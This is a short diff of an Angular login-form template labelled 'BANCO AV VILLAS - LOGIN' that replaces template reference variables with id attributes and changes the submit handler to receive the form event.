@@ -1,7 +1,7 @@
 <div>
 <form class="formoid-solid-red"
     style="background-color:#FFFFFF;font-size:14px;font-family:'Roboto',Arial,Helvetica,sans-serif;color:#34495E;max-width:500px;min-width:150px"
-    (submit)="logIn(user,pss)"
+    (submit)="logIn($event)"
     >
     <div class="title">
         <h2>BANCO AV VILLAS - LOGIN</h2>
@@ -23,8 +23,8 @@
                     <div class="element-input">
                         <label class="title"><span class="required"></span></label>
                         <div class="item-cont">
-                            <input class="large" type="text" name="input" required="required"
-                                placeholder="Usuario" #user/><span class="icon-place"></span>
+                            <input class="large" type="text" name="usuario" required="required"
+                                placeholder="Usuario" id="usuario"/><span class="icon-place"></span>
                         </div>
                     </div>
                 </td>
@@ -37,7 +37,7 @@
                         <label class="title"></label>
                         <div class="item-cont">
                             <input class="large" type="password" name="password" value="" placeholder="Contraseña"
-                                required="required" #pss/><span class="icon-place"></span>
+                                required="required" id="password"/><span class="icon-place"></span>
                         </div>
                     </div>
                 </td>
